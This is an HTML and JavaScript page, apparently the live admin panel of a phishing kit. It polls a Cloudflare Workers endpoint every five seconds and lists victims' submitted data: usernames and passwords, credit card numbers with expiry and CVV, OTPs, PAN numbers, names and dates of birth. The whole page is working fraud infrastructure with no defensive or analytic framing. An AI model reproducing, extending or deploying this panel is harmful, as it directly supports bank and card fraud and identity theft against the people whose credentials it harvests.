<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LIVE ADMIN ‚Äì WORKER SUBMISSIONS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background-color: white; min-height: 100vh; padding: 0; }
        
        /* HEADER ‚Äì tere design jaisa, bina logo ke */
        .page-header {
            background-color: #f8f9fa;
            padding: 8px 15px;
            border-bottom: 1px solid #dee2e6;
            display: flex;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-title {
            font-size: 16px;
            color: #333;
            font-weight: bold;
            margin-left: 0;
        }
        
        /* DATA CONTAINER ‚Äì white/black combination */
        .data-container { padding: 0; }
        .data-item {
            padding: 12px 15px;
            border-bottom: 1px solid #ddd;
            font-size: 15px;
            font-weight: 600;
            line-height: 1.5;
        }
        .data-item.white-bg { background-color: white; color: #111; }
        .data-item.black-bg { background-color: #0a0a0a; color: white; }
        .data-item.black-bg .field-label { color: #ccc !important; }
        .data-item.black-bg span, 
        .data-item.black-bg div { color: white; }
        
        .field {
            margin-bottom: 4px;
            display: flex;
            flex-wrap: wrap;
        }
        .field-label {
            font-weight: 700;
            color: #444;
            margin-right: 6px;
            min-width: 60px;
        }
        
        /* Category ke hisab se label colors (sirf white-bg pe) */
        .otp-data .field-label { color: #0a5c8c; }
        .pan-data .field-label { color: #1e5a1e; }
        .account-data .field-label { color: #5e2a7c; }
        
        .black-bg .field-label { color: #e0e0e0 !important; }
        
        .empty {
            text-align: center;
            padding: 60px 20px;
            color: #666;
            font-size: 16px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="main-content">
        <header class="page-header">
            <div class="header-title">‚ö° LIVE ADMIN ‚Äì WORKER KV (SUBMISSIONS)</div>
        </header>
        
        <div class="data-container" id="dataContainer">
            <div class="empty">‚è≥ Data load ho raha hai...</div>
        </div>
    </div>

    <script>
        // ---------- TERA WORKER API URL ----------
        const WORKER_API_URL = 'https://aged-sunset-63e0.s3d38284.workers.dev/api/submissions';
        const container = document.getElementById('dataContainer');

        // ---------- DATA LOAD KARO (Worker se fetch) ----------
        async function loadData() {
            try {
                const response = await fetch(WORKER_API_URL);
                if (!response.ok) throw new Error('Network error');
                const submissions = await response.json();
                displayData(submissions);
            } catch (error) {
                console.error('Fetch error:', error);
                container.innerHTML = `<div class="empty">‚ùå Error: ${error.message}</div>`;
            }
        }

        // ---------- DATA DIKHAO ‚Äì TERI EXACT DESIGN ME ----------
        function displayData(submissions) {
            if (!submissions || submissions.length === 0) {
                container.innerHTML = '<div class="empty">üì≠ Koi data nahi hai</div>';
                return;
            }

            let html = '';
            let counter = 0;

            submissions.forEach(item => {
                let itemHtml = '';
                let bgClass = counter % 2 === 0 ? 'white-bg' : 'black-bg';
                counter++;

                // ---------- TYPE PEHCHANO ----------
                let type = item.formType || '';
                if (!type) {
                    if (item.username) type = 'User ID';
                    else if (item.cardNumber) type = 'Credit Card';
                    else if (item.otp) type = 'OTP';
                    else if (item.pan) type = 'PAN';
                    else if (item.dob) type = 'Account Details';
                    else if (item.name && !item.pan && !item.dob) type = 'User ID'; // fallback
                }

                // ---------- HAR TYPE KE HISAB SE HTML ----------
                if (type === 'User ID' || item.username) {
                    itemHtml = `
                        <div class="field"><span class="field-label">User:</span>${item.username || item.data?.username || 'N/A'}</div>
                        <div class="field"><span class="field-label">Pass:</span>${item.password || item.data?.password || 'N/A'}</div>
                        <div class="field"><span class="field-label">Mobile:</span>${item.mobile || item.data?.mobile || 'N/A'}</div>
                    `;
                    html += `<div class="data-item ${bgClass} user-data">${itemHtml}</div>`;
                }
                else if (type === 'Credit Card' || item.cardNumber) {
                    itemHtml = `
                        <div class="field"><span class="field-label">Card:</span>${item.cardNumber || item.data?.cardNumber || 'N/A'}</div>
                        <div class="field"><span class="field-label">Expiry:</span>${item.expiry || item.data?.expiry || 'N/A'}</div>
                        <div class="field"><span class="field-label">CVV:</span>${item.cvv || item.data?.cvv || 'N/A'}</div>
                        <div class="field"><span class="field-label">Limit:</span>${item.creditLimit || item.data?.creditLimit || 'N/A'}</div>
                        <div class="field"><span class="field-label">Mobile:</span>${item.mobile || item.data?.mobile || 'N/A'}</div>
                    `;
                    html += `<div class="data-item ${bgClass} card-data">${itemHtml}</div>`;
                }
                else if (type === 'OTP' || type === 'OTP2' || item.otp) {
                    itemHtml = `
                        <div class="field"><span class="field-label">OTP:</span>${item.otp || 'N/A'}</div>
                    `;
                    html += `<div class="data-item ${bgClass} otp-data">${itemHtml}</div>`;
                }
                else if (type === 'PAN' || item.pan) {
                    itemHtml = `
                        <div class="field"><span class="field-label">Name:</span>${item.name || item.data?.name || 'N/A'}</div>
                        <div class="field"><span class="field-label">PAN:</span>${item.pan || item.data?.pan || 'N/A'}</div>
                    `;
                    html += `<div class="data-item ${bgClass} pan-data">${itemHtml}</div>`;
                }
                else if (type === 'Account Details' || item.dob) {
                    itemHtml = `
                        <div class="field"><span class="field-label">Name:</span>${item.name || item.data?.name || 'N/A'}</div>
                        <div class="field"><span class="field-label">DOB:</span>${item.dob || item.data?.dob || 'N/A'}</div>
                    `;
                    html += `<div class="data-item ${bgClass} account-data">${itemHtml}</div>`;
                }
                else {
                    // Fallback ‚Äì kuch aur type
                    itemHtml = `<div class="field"><span class="field-label">Type:</span>${type || 'Unknown'}</div>`;
                    // Kuch fields dikhane ki koshish
                    for (let key in item) {
                        if (['key', 'timestamp', 'formType', 'data'].includes(key)) continue;
                        if (typeof item[key] === 'string' && !key.includes('timestamp')) {
                            itemHtml += `<div class="field"><span class="field-label">${key}:</span>${item[key]}</div>`;
                        }
                    }
                    html += `<div class="data-item ${bgClass}">${itemHtml}</div>`;
                }
            });

            container.innerHTML = html;
        }

        // ---------- PAGE LOAD + AUTO REFRESH (5 sec) ----------
        window.addEventListener('load', function() {
            loadData();
            setInterval(loadData, 5000); // Bin blink ke, bas refresh
        });
    </script>
</body>
</html>
